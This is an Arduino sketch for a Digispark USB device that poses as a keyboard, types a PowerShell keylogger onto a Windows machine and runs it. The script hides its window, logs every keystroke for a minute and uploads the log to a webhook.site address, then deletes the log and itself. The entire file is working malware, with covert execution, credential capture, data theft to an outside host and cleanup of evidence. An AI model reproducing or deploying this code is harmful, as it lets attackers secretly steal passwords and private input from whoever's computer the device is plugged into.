#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

///// please visit webhook.site website to open your webhook tunnel...
//in here at the end of the powershell script you have to add your webhook id to  start receiving
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\"");//starting powershell in small window
  DigiKeyboard.delay(500);
  ////// scrolling code babyy /////
  
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);

  // scrolling code end /////////

  //// powershell script //////
  DigiKeyboard.println(F("$put = \"`$t`='[DllImport(\"\"user32.dll\"\")] public static extern bool ShowWindow(int handle, int state);'\nadd-type -name win -member `$t` -namespace native\n[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)\nfunction Start-KeyLogger(`$P`=\"\"`$env`:temp\\kl.txt\"\")\n{\n `$si` = @'\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto, ExactSpelling=true)]\npublic static extern short GetAsyncKeyState(int virtualKeyCode);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"\"user32.dll\"\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n'@\n`$A` = Add-Type -MemberDefinition `$si` -Name 'Win32' -Namespace API -PassThru\n`$null` = New-Item -Path `$P` -ItemType File -Force\ntry\n{\n`$ti` = get-date\ndo\n{\nStart-Sleep -Milliseconds 40\nfor (`$as` = 9; `$as` -le 254; `$as`++) {\n`$state` = `$A`::GetAsyncKeyState(`$as`)\nif (`$state` -eq -32767) {\n`$null` = [console]::CapsLock\n`$VK` = `$A`::MapVirtualKey(`$as`, 3)\n`$kbS` = New-Object Byte[] 256\n`$checkkbstate` = `$A`::GetKeyboardState(`$kbS`)\n`$mychar` = New-Object -TypeName System.Text.StringBuilder\n`$success` = `$A`::ToUnicode(`$as`, `$VK`, `$kbS`, `$mychar`, `$mychar`.Capacity, 0)\nif (`$success`)\n{\n[System.IO.File]::AppendAllText(`$P`, `$mychar`, [System.Text.Encoding]::Unicode)\n}}}}\nwhile ((Get-Date).AddMinutes(-1) -le `$ti`)\n}\nfinally\n{\npowershell Invoke-WebRequest -Uri https://webhook.site/bb75a9ec-dac4-4b87-a1d7-cb3159284bb9 -Method POST -ContentType 'text/plain' -InFile \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\kl.txt\"\"\npowershell Remove-Item -Path \"\"`$env`:temp\\log.ps1\"\"\n}}\nStart-KeyLogger\""));//dumping keylogger
  DigiKeyboard.delay(100);
  DigiKeyboard.println("write-output $put > $env:temp\\log.ps1");//droping keylogger
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cd $env:temp");//changing dir
  DigiKeyboard.delay(100);
  DigiKeyboard.println(".\\log.ps1"); //executing payload its better if im exciting the code after execution
  DigiKeyboard.delay(100);

  digitalWrite(1, HIGH); //turn on led when program finishes0
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000); //dealy time before fuck
}
